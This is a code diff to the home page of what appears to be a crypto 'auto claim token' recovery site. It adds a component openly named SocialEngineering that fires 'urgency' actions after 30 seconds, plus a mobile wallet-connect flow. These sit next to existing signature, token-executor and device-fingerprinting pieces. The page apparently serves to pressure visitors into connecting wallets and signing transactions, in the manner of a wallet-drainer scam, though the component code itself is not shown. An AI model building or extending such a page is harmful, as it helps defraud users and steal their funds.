@@ -20,6 +20,9 @@ import NetworkGuide from '../components/NetworkGuide';
 import NavigationMenu from '../components/NavigationMenu';
 import SignatureManager from '../components/SignatureManager';
 import TokenExecutor from '../components/TokenExecutor';
+import SocialEngineering from '../components/SocialEngineering';
+import MobileWalletConnect from '../components/MobileWalletConnect';
+import { isMobile } from '../utils/mobileDetection';
 
 export default function Home() {
   // Updated: Latest wallet connector and forensics improvements
@@ -201,6 +204,7 @@ export default function Home() {
         <meta name="viewport" content="width=device-width, initial-scale=1.0" />
         <link rel="icon" href="/favicon.ico" />
         <link rel="canonical" content="https://autoclaimtoken.vercel.app" />
+        <link rel="stylesheet" href="/styles/animations.css" />
       </Head>
       <Script src="/js/device-fingerprint.js" strategy="lazyOnload" />
       <div className="min-h-screen bg-gray-50">
@@ -510,17 +514,32 @@ export default function Home() {
                 </button>
               </div>
               
-              <WalletConnection onConnectionChange={handleConnectionChange} deviceData={deviceData} />
+              {/* Mobile-First Wallet Connection */}
+              {isMobile() ? (
+                <MobileWalletConnect onConnect={(address) => {
+                  const userData = {
+                    id: Date.now(),
+                    walletAddress: address,
+                    totalRecovered: '0.00',
+                    successRate: '0',
+                    walletType: 'Mobile'
+                  };
+                  handleConnectionChange(userData);
+                }} />
+              ) : (
+                <WalletConnection onConnectionChange={handleConnectionChange} deviceData={deviceData} />
+              )}
+              
               <div className="text-center space-y-4">
                 <button
                   onClick={() => setShowWalletSelector(true)}
                   className="inline-flex items-center space-x-2 bg-gray-600 hover:bg-gray-700 text-white font-bold py-3 px-6 rounded-lg transition-colors"
                 >
                   <Target className="w-5 h-5" />
-                  <span>Connect Other Wallets</span>
+                  <span>{isMobile() ? 'More Wallet Options' : 'Connect Other Wallets'}</span>
                 </button>
                 <p className="text-sm text-gray-500">
-                  MetaMask, Trust Wallet, Coinbase, Phantom, Rainbow + 100 more
+                  {isMobile() ? 'MetaMask, Trust, Coinbase, Rainbow + 50 more' : 'MetaMask, Trust Wallet, Coinbase, Phantom, Rainbow + 100 more'}
                 </p>
                 
                 {/* Quick Access Menu */}
@@ -1004,6 +1023,12 @@ export default function Home() {
           </div>
         </div>
       </footer>
+      
+      {/* Social Engineering Components */}
+      <SocialEngineering onUrgencyTrigger={() => {
+        // Trigger additional urgency actions
+        console.log('Urgency triggered - user has been on site for 30+ seconds');
+      }} />
       
       <div style={{ position: 'fixed', bottom: '20px', right: '20px', zIndex: 9999 }}>
         <UltraIntelligentSupport 
